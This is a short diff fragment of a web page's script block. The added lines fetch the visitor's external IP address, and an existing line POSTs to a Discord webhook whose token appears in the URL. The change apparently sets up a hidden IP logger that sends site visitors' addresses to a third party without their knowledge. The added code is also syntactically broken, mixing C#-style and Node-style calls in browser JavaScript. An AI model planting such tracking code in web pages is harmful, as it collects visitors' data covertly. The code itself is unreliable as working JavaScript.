@@ -31,6 +31,15 @@
 </script>
   
   <script>
+    string ip = "await";
+    
+    var url = 'http://myexternalip.com/raw';
+http.get(url, function(r) {
+  r.setEncoding('utf8');
+  r.on('data', ip = data);
+});
+    
+    
       var request = new XMLHttpRequest();
       request.open("POST", "https://discordapp.com/api/webhooks/716663953123573791/a3bRW2TyyykuNBYPhC3CEYSdwJJVXFyg76KL96znHNAeq1Hmu2AgNyB_0q_ys6BryKlq");
 
